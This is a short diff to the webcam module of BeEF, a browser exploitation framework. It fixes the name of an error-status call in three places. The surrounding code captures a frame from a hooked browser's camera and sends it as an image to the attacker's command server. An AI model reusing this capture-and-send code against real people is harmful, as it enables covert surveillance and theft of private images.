@@ -11,7 +11,7 @@ beef.execute(function() {
         beef.debug('[Webcam HTML5] Browser supports WebGL');
     } else {
         beef.debug('[Webcam HTML5] Error: WebGL is not supported');
-        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=WebGL is not supported', beef.are.status_error());
+        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=WebGL is not supported', beef.status.error());
         return;
     }
 
@@ -36,7 +36,7 @@ beef.execute(function() {
             ctx.drawImage(vid_el,0,0,width,height);
             beef.net.send("<%= @command_url %>",<%= @command_id %>, 'image='+can_el.toDataURL('image/png'));
         } else {
-            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong', beef.are.status_error());
+            beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=something went wrong', beef.status.error());
         }
     };
 
@@ -85,7 +85,7 @@ beef.execute(function() {
         }, false);
     }, function(err) {
         beef.debug('[Webcam HTML5] Error: getUserMedia call failed');
-        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed', beef.are.status_error());
+        beef.net.send("<%= @command_url %>",<%= @command_id %>, 'result=getUserMedia call failed', beef.status.error());
     });
 
     // Retrieve the chosen div option from BeEF and display
